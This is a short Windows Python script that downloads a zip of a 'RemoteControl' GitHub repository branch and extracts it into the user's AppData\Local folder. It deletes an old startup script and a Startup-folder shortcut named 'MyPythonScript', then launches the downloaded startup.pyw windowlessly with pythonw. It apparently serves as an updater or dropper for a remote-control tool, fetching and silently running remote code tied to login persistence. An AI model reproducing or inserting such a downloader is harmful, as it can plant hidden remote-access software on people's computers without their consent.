import shutil
import os
import subprocess
import requests
import zipfile
import sys
from pathlib import Path

user_profile = os.environ['USERPROFILE']
target_path = os.path.join(user_profile, 'AppData', 'Local')
os.makedirs(target_path, exist_ok=True)

os.remove(os.path.join(target_path, 'RemoteControl-startup', "startup.py"))

r = requests.get("https://github.com/noel-create/RemoteControl/archive/refs/heads/startup.zip", allow_redirects=True)
file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'RemoteControl-startup.zip')
open(file_path, 'wb').write(r.content)
with zipfile.ZipFile(file_path, 'r') as zip_ref:
    zip_ref.extractall(target_path)
os.remove(file_path)

startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
shortcut_name="MyPythonScript"
shortcut_path = startup_dir / f"{shortcut_name}.lnk"
os.remove(shortcut_path)

subprocess.Popen(['pythonw', os.path.join(target_path, "RemoteControl-startup", "startup.pyw")])